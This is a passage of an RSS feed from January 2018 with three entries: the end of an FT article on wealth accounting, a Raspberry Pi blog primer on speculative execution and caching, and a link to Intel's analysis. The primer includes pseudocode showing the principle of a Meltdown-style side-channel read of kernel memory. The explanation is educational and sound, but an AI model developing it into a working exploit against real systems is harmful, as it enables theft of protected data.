&lt;div class=&quot;n-image-wrapper n-image-wrapper--placeholder&quot;&gt;&lt;img alt=&quot;&quot; role=&quot;presentation&quot; class=&quot;n-image&quot; srcset=&quot;https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2F640e395a-f20f-11e7-ac08-07c3086a2625?source=next&amp;amp;fit=scale-down&amp;amp;width=700 700w, https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2F640e395a-f20f-11e7-ac08-07c3086a2625?source=next&amp;amp;fit=scale-down&amp;amp;width=500 500w, https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2F640e395a-f20f-11e7-ac08-07c3086a2625?source=next&amp;amp;fit=scale-down&amp;amp;width=300 300w&quot; sizes=&quot;(min-width: 76.25em) 700px, (min-width: 61.25em) 620px, (min-width: 46.25em) 700px, calc(100vw - 20px)&quot;/&gt;&lt;/div&gt;
&lt;p&gt;Yet in practice, as my colleague Martin Wolf told me, there are limits. We may love our children and their children and even their unborn children. But what about the children after them and those after them? “The question of sustainability is partly: who cares about the future?” he said. In the long run, “we will all be zero-energy soup”.&lt;/p&gt;
&lt;p&gt;Such practical and philosophical considerations aside, there is now real momentum behind wealth accounting, even among the most orthodox of institutions. This month, the World Bank will release the most comprehensive attempt yet to crack the problem.&lt;/p&gt;
&lt;p&gt;The Changing Wealth of Nations 2018 is the fruit of years of work by a dedicated team. It builds on research published in 2006 and 2011. In its latest iteration, the bank produces comprehensive wealth accounts for 141 countries between 1995 and 2014. For each country, there are estimates for “produced” capital, including urban land, machinery and infrastructure. Natural capital includes market values for subsoil assets, such as oil and copper, arable land, forests and conservative estimates for protected areas, which are priced as if they were farmland.&lt;/p&gt;
&lt;blockquote class=&quot;n-content-pullquote&quot; aria-hidden=&quot;true&quot; readability=&quot;29.5&quot;&gt;
&lt;div class=&quot;n-content-pullquote__content&quot; readability=&quot;33&quot;&gt;
&lt;p&gt;To GDP, a clapped-out British train did just as well as a Japanese Shinkansen travelling at 200mph&lt;/p&gt;
&lt;/div&gt;
&lt;/blockquote&gt;
&lt;p&gt;For the first time, the bank makes an explicit attempt to measure human capital. Using a database of 1,500 household surveys, it estimates the present value of the projected lifetime earnings of nearly everyone on the planet.&lt;/p&gt;
&lt;p&gt;“We’re looking at GDP as a return on wealth,” says Glenn-Marie Lange, co-editor of the report and leader of the bank’s wealth accounting team. “Policymakers need this information to design strategies to ensure that their GDP growth is sustained in the long run.’’&lt;/p&gt;
&lt;p&gt;Among the report’s findings, the full details of which are embargoed, is a huge shift of wealth over 20 years to middle-income countries, largely driven by the rise of China and other Asian countries. A third of low-income countries, however, especially in Africa, have suffered an outright fall in per capita wealth over that period, in what could be a dangerous omen about their capacity for future growth. In the world as a whole, the report finds, human capital represents a whopping 65 per cent of total wealth. In 2014, this was $1,143tn, or about 15 times that year’s GDP.&lt;/p&gt;
&lt;div class=&quot;n-image-wrapper n-image-wrapper--placeholder&quot;&gt;&lt;img alt=&quot;&quot; role=&quot;presentation&quot; class=&quot;n-image&quot; srcset=&quot;https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2F681eebe8-f20f-11e7-ac08-07c3086a2625?source=next&amp;amp;fit=scale-down&amp;amp;width=700 700w, https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2F681eebe8-f20f-11e7-ac08-07c3086a2625?source=next&amp;amp;fit=scale-down&amp;amp;width=500 500w, https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2F681eebe8-f20f-11e7-ac08-07c3086a2625?source=next&amp;amp;fit=scale-down&amp;amp;width=300 300w&quot; sizes=&quot;(min-width: 76.25em) 700px, (min-width: 61.25em) 620px, (min-width: 46.25em) 700px, calc(100vw - 20px)&quot;/&gt;&lt;/div&gt;
&lt;p&gt;The report is particularly illuminating in tracing the path to development as countries, in the manner described by Dasgupta, trade in one form of capital for another. Crudely put, they use income derived from natural resources to build up other forms of capital, principally in infrastructure, technology, health and education. So, while natural capital accounts for 47 per cent of the wealth of low-income countries, it represents only 3 per cent of the wealth of the most advanced.&lt;/p&gt;
&lt;p&gt;The lesson, says Collier of the Blavatnik school and author of &lt;em&gt;The Bottom Billion&lt;/em&gt;, a book about failing economies, is that spurts of GDP don’t tell you anything if you don’t know about underlying wealth. In Africa, countries such as Nigeria have converted resources into consumption booms, but have largely failed to build the infrastructure or invest in the healthy, educated population that will sustain future growth.&lt;/p&gt;
&lt;p&gt;Much of Africa, says Collier, has “dug itself up and chopped itself down, but didn’t build enough in its place. It’s not sustainable growth. It’s a fiction of the flow data.” It is a lesson that Bill, the indebted banker with limited future earning prospects, would have done well to take to heart.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;The writer is the FT’s Africa editor. His new book ‘The Growth Delusion: Wealth, Poverty and the Well-Being of Nations’ is published by Bloomsbury in the UK on January 25 and in the US by Tim Duggan Books on January 30&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Follow &lt;a href=&quot;https://twitter.com/FTLifeArts&quot; data-trackable=&quot;link&quot; target=&quot;_blank&quot;&gt;@FTLifeArts&lt;/a&gt; on Twitter to find out about our latest stories first. Subscribe to &lt;a href=&quot;https://www.youtube.com/channel/UCG4Bnj7ZedwrnesSF7QjEAA&quot; data-trackable=&quot;link&quot; target=&quot;_blank&quot;&gt;FT Life&lt;/a&gt; on YouTube for the latest FT Weekend videos&lt;/em&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 05 Jan 2018 18:41:11 +0000</pubDate>
<dc:creator>fmihaila</dc:creator>
<og:title>Why it is time to change the way we measure the wealth of nations</og:title>
<og:description>GDP is the most widely used measure of economic success — but is it misleading?</og:description>
<og:image>http://prod-upp-image-read.ft.com/93a20b66-f178-11e7-ac08-07c3086a2625</og:image>
<og:url>https://www.ft.com/content/765781fe-f136-11e7-b220-857e26d1aca4</og:url>
<og:type>article</og:type>
<dc:language>en-GB</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.ft.com/content/765781fe-f136-11e7-b220-857e26d1aca4</dc:identifier>
</item>
<item>
<title>Why Raspberry Pi Isn&amp;#039;t Vulnerable to Spectre or Meltdown</title>
<link>https://www.raspberrypi.org/blog/why-raspberry-pi-isnt-vulnerable-to-spectre-or-meltdown/</link>
<guid isPermaLink="true" >https://www.raspberrypi.org/blog/why-raspberry-pi-isnt-vulnerable-to-spectre-or-meltdown/</guid>
<description>&lt;p&gt;Over the last couple of days, there has been a lot of discussion about a pair of security vulnerabilities nicknamed &lt;a href=&quot;https://spectreattack.com/&quot;&gt;Spectre and Meltdown&lt;/a&gt;. These affect all modern Intel processors, and (in the case of Spectre) many AMD processors and &lt;a href=&quot;https://developer.arm.com/support/security-update&quot;&gt;ARM cores&lt;/a&gt;. Spectre allows an attacker to bypass software checks to read data from arbitrary locations in the current address space; Meltdown allows an attacker to read data from arbitrary locations in the operating system kernel’s address space (which should normally be inaccessible to user programs).&lt;/p&gt;
&lt;p&gt;Both vulnerabilities exploit performance features (&lt;em&gt;caching&lt;/em&gt; and &lt;em&gt;speculative execution&lt;/em&gt;) common to many modern processors to leak data via a so-called side-channel attack. Happily, the Raspberry Pi isn’t susceptible to these vulnerabilities, because of the particular ARM cores that we use.&lt;/p&gt;
&lt;p&gt;To help us understand why, here’s a little primer on some concepts in modern processor design. We’ll illustrate these concepts using simple programs in Python syntax like this one:&lt;/p&gt;
&lt;pre&gt;
t = a+b
u = c+d
v = e+f
w = v+g
x = h+i
y = j+k
&lt;/pre&gt;
&lt;p&gt;While the processor in your computer doesn’t execute Python directly, the statements here are simple enough that they roughly correspond to a single machine instruction. We’re going to gloss over some details (notably &lt;a href=&quot;https://en.wikipedia.org/wiki/Pipeline_(computing)&quot;&gt;pipelining&lt;/a&gt; and &lt;a href=&quot;https://en.wikipedia.org/wiki/Register_renaming&quot;&gt;register renaming&lt;/a&gt;) which are very important to processor designers, but which aren’t necessary to understand how Spectre and Meltdown work.&lt;/p&gt;
&lt;p&gt;For a comprehensive description of processor design, and other aspects of modern computer architecture, you can’t do better than Hennessy and Patterson’s classic &lt;em&gt;&lt;a href=&quot;https://www.amazon.co.uk/Computer-Architecture-Quantitative-Approach-Kaufmann/dp/012383872X&quot;&gt;Computer Architecture: A Quantitative Approach&lt;/a&gt;&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;What is a scalar processor?&lt;/h2&gt;
&lt;p&gt;The simplest sort of modern processor executes one instruction per cycle; we call this a scalar processor. Our example above will execute in six cycles on a scalar processor.&lt;/p&gt;
&lt;p&gt;Examples of scalar processors include the Intel 486 and the ARM1176 core used in Raspberry Pi 1 and Raspberry Pi Zero.&lt;/p&gt;
&lt;h2&gt;What is a superscalar processor?&lt;/h2&gt;
&lt;p&gt;The obvious way to make a scalar processor (or indeed any processor) run faster is to increase its clock speed. However, we soon reach limits of how fast the logic gates inside the processor can be made to run; processor designers therefore began to look for ways to do several things at once.&lt;/p&gt;
&lt;p&gt;An in-order superscalar processor examines the incoming stream of instructions and tries execute more than one at once, in one of several &lt;em&gt;pipelines&lt;/em&gt; (&lt;em&gt;pipes&lt;/em&gt; for short), subject to dependencies between the instructions. Dependencies are important: you might think that a two-way superscalar processor could just pair up (or &lt;em&gt;dual-issue&lt;/em&gt;) the six instructions in our example like this:&lt;/p&gt;
&lt;pre&gt;
t, u = a+b, c+d
v, w = e+f, v+g
x, y = h+i, j+k
&lt;/pre&gt;
&lt;p&gt;But this doesn’t make sense: we have to compute &lt;code&gt;v&lt;/code&gt; before we can compute &lt;code&gt;w&lt;/code&gt;, so the third and fourth instructions can’t be executed at the same time. Our two-way superscalar processor won’t actually be able to find anything to pair with the third instruction, so our example will execute in four cycles:&lt;/p&gt;
&lt;pre&gt;
t, u = a+b, c+d
v    = e+f                   # second pipe does nothing here
w, x = v+g, h+i
y    = j+k
&lt;/pre&gt;
&lt;p&gt;Examples of superscalar processors include the Intel Pentium, and the ARM Cortex-A7 and Cortex-A53 cores used in Raspberry Pi 2 and Raspberry Pi 3 respectively. Raspberry Pi 3 has only a 33% higher clock speed than Raspberry Pi 2, but has roughly double the performance: the extra performance is partly a result of Cortex-A53’s ability to dual-issue a broader range of instructions than Cortex-A7.&lt;/p&gt;
&lt;h2&gt;What is an out-of-order processor?&lt;/h2&gt;
&lt;p&gt;Going back to our example, we can see that, although we have a dependency between &lt;code&gt;v&lt;/code&gt; and &lt;code&gt;w&lt;/code&gt;, we have other independent instructions later in the program that we could potentially have used to fill the empty pipe during the second cycle. An out-of-order superscalar processor has the ability to shuffle the order of incoming instructions (again subject to dependencies) in order to keep its pipes busy.&lt;/p&gt;
&lt;p&gt;An out-of-order processor might effectively swap the definitions of &lt;code&gt;w&lt;/code&gt; and &lt;code&gt;x&lt;/code&gt; in our example like this:&lt;/p&gt;
&lt;pre&gt;
t = a+b
u = c+d
v = e+f
x = h+i
w = v+g
y = j+k
&lt;/pre&gt;
&lt;p&gt;allowing it to execute in three cycles:&lt;/p&gt;
&lt;pre&gt;
t, u = a+b, c+d
v, x = e+f, h+i
w, y = v+g, j+k
&lt;/pre&gt;
&lt;p&gt;Examples of out-of-order processors include the Intel Pentium 2 (and most subsequent Intel and AMD x86 processors with the exception of some Atom and Quark devices), and many recent ARM cores, including Cortex-A9, -A15, -A17, and -A57.&lt;/p&gt;
&lt;h2&gt;What is a branch predictor?&lt;/h2&gt;
&lt;p&gt;Our example above is a straight-line piece of code. Real programs aren’t like this of course: they also contain both forward branches (used to implement conditional operations like &lt;code&gt;if&lt;/code&gt; statements), and backward branches (used to implement loops). Branches may be unconditional (always taken), or conditional (taken or not, depending on a computed value).&lt;/p&gt;
&lt;p&gt;While fetching instructions, a processor may encounter a conditional branch which depends on a value which has yet to be computed. To avoid a stall, it must guess which instruction to fetch next: the next one in memory order (corresponding to an untaken branch), or the one at the branch target (corresponding to a taken branch). A &lt;em&gt;branch predictor&lt;/em&gt; helps the processor make an intelligent guess about whether a branch will be taken or not. It does this by gathering statistics about how often particular branches have been taken in the past.&lt;/p&gt;
&lt;p&gt;Modern branch predictors are extremely sophisticated, and can generate very accurate predictions. Raspberry Pi 3’s extra performance is partly a result of improvements in branch prediction between Cortex-A7 and Cortex-A53. However, by executing a crafted series of branches, an attacker can mis-train a branch predictor to make poor predictions.&lt;/p&gt;
&lt;h2&gt;What is speculation?&lt;/h2&gt;
&lt;p&gt;Reordering sequential instructions is a powerful way to recover more instruction-level parallelism, but as processors become wider (able to triple- or quadruple-issue instructions) it becomes harder to keep all those pipes busy. Modern processors have therefore grown the ability to &lt;em&gt;speculate&lt;/em&gt;. Speculative execution lets us issue instructions which might turn out not to be required (because they may be branched over): this keeps a pipe busy (use it or lose it!), and if it turns out that the instruction isn’t executed, we can just throw the result away.&lt;/p&gt;
&lt;p&gt;Speculatively executing unnecessary instructions (and the infrastructure required to support speculation and reordering) consumes extra energy, but in many cases this is considered a worthwhile tradeoff to obtain extra single-threaded performance. The branch predictor is used to choose the most likely path through the program, maximising the chance that the speculation will pay off.&lt;/p&gt;
&lt;p&gt;To demonstrate the benefits of speculation, let’s look at another example:&lt;/p&gt;
&lt;pre&gt;
t = a+b
u = t+c
v = u+d
if v:
   w = e+f
   x = w+g
   y = x+h
&lt;/pre&gt;
&lt;p&gt;Now we have dependencies from &lt;code&gt;t&lt;/code&gt; to &lt;code&gt;u&lt;/code&gt; to &lt;code&gt;v&lt;/code&gt;, and from &lt;code&gt;w&lt;/code&gt; to &lt;code&gt;x&lt;/code&gt; to &lt;code&gt;y&lt;/code&gt;, so a two-way out-of-order processor without speculation won’t ever be able to fill its second pipe. It spends three cycles computing &lt;code&gt;t&lt;/code&gt;, &lt;code&gt;u&lt;/code&gt;, and &lt;code&gt;v&lt;/code&gt;, after which it knows whether the body of the &lt;code&gt;if&lt;/code&gt; statement will execute, in which case it then spends three cycles computing &lt;code&gt;w&lt;/code&gt;, &lt;code&gt;x&lt;/code&gt;, and &lt;code&gt;y&lt;/code&gt;. Assuming the &lt;code&gt;if&lt;/code&gt; (implemented by a branch instruction) takes one cycle, our example takes either four cycles (if &lt;code&gt;v&lt;/code&gt; turns out to be zero) or seven cycles (if &lt;code&gt;v&lt;/code&gt; is non-zero).&lt;/p&gt;
&lt;p&gt;If the branch predictor indicates that the body of the &lt;code&gt;if&lt;/code&gt; statement is likely to execute, speculation effectively shuffles the program like this:&lt;/p&gt;
&lt;pre&gt;
t = a+b
u = t+c
v = u+d
w_ = e+f
x_ = w_+g
y_ = x_+h
if v:
   w, x, y = w_, x_, y_
&lt;/pre&gt;
&lt;p&gt;so we now have additional instruction level parallelism to keep our pipes busy:&lt;/p&gt;
&lt;pre&gt;
t, w_ = a+b, e+f
u, x_ = t+c, w_+g
v, y_ = u+d, x_+h
if v:
   w, x, y = w_, x_, y_
&lt;/pre&gt;
&lt;p&gt;Cycle counting becomes less well defined in speculative out-of-order processors, but the branch and conditional update of &lt;code&gt;w&lt;/code&gt;, &lt;code&gt;x&lt;/code&gt;, and &lt;code&gt;y&lt;/code&gt; are (approximately) free, so our example executes in (approximately) three cycles.&lt;/p&gt;
&lt;h2&gt;What is a cache?&lt;/h2&gt;
&lt;p&gt;In the good old days*, the speed of processors was well matched with the speed of memory access. My BBC Micro, with its 2MHz 6502, could execute an instruction roughly every 2µs (microseconds), and had a memory cycle time of 0.25µs. Over the ensuing 35 years, processors have become very much faster, but memory only modestly so: a single Cortex-A53 in a Raspberry Pi 3 can execute an instruction roughly every 0.5ns (nanoseconds), but can take up to 100ns to access main memory.&lt;/p&gt;
&lt;p&gt;At first glance, this sounds like a disaster: every time we access memory, we’ll end up waiting for 100ns to get the result back. In this case, this example:&lt;/p&gt;
&lt;pre&gt;
a = mem[0]
b = mem[1]
&lt;/pre&gt;
&lt;p&gt;would take 200ns.&lt;/p&gt;
&lt;p&gt;However, in practice, programs tend to access memory in relatively predictable ways, exhibiting both temporal locality (if I access a location, I’m likely to access it again soon) and spatial locality (if I access a location, I’m likely to access a nearby location soon). Caching takes advantage of these properties to reduce the average cost of access to memory.&lt;/p&gt;
&lt;p&gt;A cache is a small on-chip memory, close to the processor, which stores copies of the contents of recently used locations (and their neighbours), so that they are quickly available on subsequent accesses. With caching, the example above will execute in a little over 100ns:&lt;/p&gt;
&lt;pre&gt;
a = mem[0]    # 100ns delay, copies mem[0:15] into cache
b = mem[1]    # mem[1] is in the cache
&lt;/pre&gt;
&lt;p&gt;From the point of view of Spectre and Meltdown, the important point is that if you can time how long a memory access takes, you can determine whether the address you accessed was in the cache (short time) or not (long time).&lt;/p&gt;
&lt;h2&gt;What is a side channel?&lt;/h2&gt;
&lt;p&gt;From Wikipedia:&lt;/p&gt;
&lt;p&gt;“… a side-channel attack is any attack based on information gained from the physical implementation of a cryptosystem, rather than brute force or theoretical weaknesses in the algorithms (compare cryptanalysis). For example, timing information, power consumption, electromagnetic leaks or even sound can provide an extra source of information, which can be exploited to break the system.”&lt;/p&gt;
&lt;p&gt;Spectre and Meltdown are side-channel attacks which deduce the contents of a memory location which should not normally be accessible by using timing to observe whether another, accessible, location is present in the cache.&lt;/p&gt;
&lt;h2&gt;Putting it all together&lt;/h2&gt;
&lt;p&gt;Now let’s look at how speculation and caching combine to permit a Meltdown-like attack on our processor. Consider the following example, which is a user program that sometimes reads from an illegal (kernel) address, resulting in a fault (crash):&lt;/p&gt;
&lt;pre&gt;
t = a+b
u = t+c
v = u+d
if v:
   w = kern_mem[address]   # if we get here, fault
   x = w&amp;amp;0x100
   y = user_mem[x]
&lt;/pre&gt;
&lt;p&gt;Now, provided we can train the branch predictor to believe that &lt;code&gt;v&lt;/code&gt; is likely to be non-zero, our out-of-order two-way superscalar processor shuffles the program like this:&lt;/p&gt;
&lt;pre&gt;
t, w_ = a+b, kern_mem[address]
u, x_ = t+c, w_&amp;amp;0x100
v, y_ = u+d, user_mem[x_]

if v:
   # fault
   w, x, y = w_, x_, y_      # we never get here
&lt;/pre&gt;
&lt;p&gt;Even though the processor always speculatively reads from the kernel address, it must defer the resulting fault until it knows that &lt;code&gt;v&lt;/code&gt; was non-zero. On the face of it, this feels safe because either:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;v&lt;/code&gt; is zero, so the result of the illegal read isn’t committed to &lt;code&gt;w&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;v&lt;/code&gt; is non-zero, but the fault occurs before the read is committed to &lt;code&gt;w&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;However, suppose we flush our cache before executing the code, and arrange &lt;code&gt;a&lt;/code&gt;, &lt;code&gt;b&lt;/code&gt;, &lt;code&gt;c&lt;/code&gt;, and &lt;code&gt;d&lt;/code&gt; so that &lt;code&gt;v&lt;/code&gt; is actually zero. Now, the speculative read in the third cycle:&lt;/p&gt;
&lt;pre&gt;
v, y_ = u+d, user_mem[x_]
&lt;/pre&gt;
&lt;p&gt;will access either userland address &lt;code&gt;0x000&lt;/code&gt; or address &lt;code&gt;0x100&lt;/code&gt; depending on the eighth bit of the result of the illegal read, loading that address and its neighbours into the cache. Because &lt;code&gt;v&lt;/code&gt; is zero, the results of the speculative instructions will be discarded, and execution will continue. If we time a subsequent access to one of those addresses, we can determine which address is in the cache. Congratulations: you’ve just read a single bit from the kernel’s address space!&lt;/p&gt;
&lt;p&gt;The real Meltdown exploit is substantially more complex than this (notably, to avoid having to mis-train the branch predictor, the authors prefer to execute the illegal read unconditionally and handle the resulting exception), but the principle is the same. Spectre uses a similar approach to subvert software array bounds checks.&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Modern processors go to great lengths to preserve the abstraction that they are in-order scalar machines that access memory directly, while in fact using a host of techniques including caching, instruction reordering, and speculation to deliver much higher performance than a simple processor could hope to achieve. Meltdown and Spectre are examples of what happens when we reason about security in the context of that abstraction, and then encounter minor discrepancies between the abstraction and reality.&lt;/p&gt;
&lt;p&gt;The lack of speculation in the ARM1176, Cortex-A7, and Cortex-A53 cores used in Raspberry Pi render us immune to attacks of the sort.&lt;/p&gt;
&lt;p&gt;* days may not be that old, or that good&lt;/p&gt;
</description>
<pubDate>Fri, 05 Jan 2018 17:29:06 +0000</pubDate>
<dc:creator>MikusR</dc:creator>
<og:type>article</og:type>
<og:title>Why Raspberry Pi isn't vulnerable to Spectre or Meltdown - Raspberry Pi</og:title>
<og:description>Eben gives you a crash course in how modern processors work to explain why Raspberry Pi is unaffected by the Spectre and Meltdown security vulnerabilities.</og:description>
<og:url>https://www.raspberrypi.org/blog/why-raspberry-pi-isnt-vulnerable-to-spectre-or-meltdown/</og:url>
<og:image>https://www.raspberrypi.org/app/uploads/2018/01/IMG_0037_1-Recovered-2-500x334.jpg</og:image>
<dc:language>en-GB</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.raspberrypi.org/blog/why-raspberry-pi-isnt-vulnerable-to-spectre-or-meltdown/</dc:identifier>
</item>
<item>
<title>Intel Analysis of Speculative Execution Side Channels [pdf]</title>
<link>https://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf</link>
<guid isPermaLink="true" >https://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf</guid>
<description>&lt;a href=&quot;https://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf&quot;&gt;Download PDF&lt;/a&gt;</description>
<pubDate>Fri, 05 Jan 2018 17:18:24 +0000</pubDate>
<dc:creator>bcantrill</dc:creator>
<og:type>article</og:type>
<og:title>Why Raspberry Pi isn't vulnerable to Spectre or Meltdown - Raspberry Pi</og:title>
<og:description>Eben gives you a crash course in how modern processors work to explain why Raspberry Pi is unaffected by the Spectre and Meltdown security vulnerabilities.</og:description>
<og:url>https://www.raspberrypi.org/blog/why-raspberry-pi-isnt-vulnerable-to-spectre-or-meltdown/</og:url>
<og:image>https://www.raspberrypi.org/app/uploads/2018/01/IMG_0037_1-Recovered-2-500x334.jpg</og:image>
<dc:language>en-GB</dc:language>
<dc:format>application/pdf</dc:format>
<dc:identifier>https://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf</dc:identifier>
</item>
</channel>
</rss>